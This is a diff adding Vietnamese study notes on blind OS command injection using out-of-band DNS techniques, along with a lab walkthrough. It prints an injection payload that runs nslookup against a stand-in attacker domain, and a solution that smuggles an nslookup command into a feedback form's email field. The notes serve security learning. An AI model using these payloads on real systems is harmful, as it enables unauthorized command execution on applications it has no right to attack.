@@ -145,3 +145,29 @@
 
 > Chuyển sang off và nhận kết quả:
 > ![img](../asset/os-command-injection-3-Blind-OS-command-injection-with-output-redirection-7.png) ![img](../asset/os-command-injection-3-Blind-OS-command-injection-with-output-redirection-8.png)
+
+## Exploiting blind OS command injection using out-of-band (OAST) techniques
+
+> Có thể sử dụng một lệnh được đưa vào sẽ kích hoạt tương tác `out-of-band` với system mà bạn kiểm soát, sử dụng các kỹ thuật `OAST`:
+>
+> ```
+> & nslookup kgji2ohoyw.web-attacker.com &
+> ```
+
+> payload sử dụng command `nslookup` để thực hiện tra cứu DNS cho miền được chỉ định. Attacker có thể theo dõi việc tra cứu đang diễn ra, do đó phát hiện rằng lệnh đã được đưa vào thành công
+
+### Lab: Blind OS command injection with out-of-band interaction
+
+> Des: Lab này dính vil OS command injection tại chức năng feedback.
+>
+> Ứng dụng thực thi shell do user nhập vào. Command thực thi không đồng bộ và k ảnh hưởng tới response của app. Không thể redirect ra vị trí mà mong muốn. Tuy nhiên có thể kích hoạt `out-of-band` để tương tác với miền bên ngoài
+>
+> Để solve thì exploit và đưa ra DNS cho `Burp Collaborator`
+
+> Bài này chỉ cần chặn lúc submit feedback và sửa field email:
+>
+> ```
+> email=x||nslookup+link||
+> ```
+>
+> ![img](../asset/os-command-injection-4-Blind-OS-command-injection-with-out-of-band-interaction-0.png) ![img](../asset/os-command-injection-4-Blind-OS-command-injection-with-out-of-band-interaction-1.png)
